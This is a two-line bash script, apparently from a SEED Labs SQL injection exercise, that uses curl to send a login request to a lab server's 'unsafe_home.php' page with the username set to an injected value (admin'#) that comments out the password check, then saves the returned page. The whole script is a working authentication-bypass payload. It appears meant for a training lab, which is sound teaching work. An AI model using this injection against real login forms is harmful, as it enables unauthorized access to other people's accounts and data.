#!/usr/bin/env bash

#attack using command line

curl 'www.seed-server.com/unsafe_home.php?username=admin%27%23&Password=xyz' --output data.html
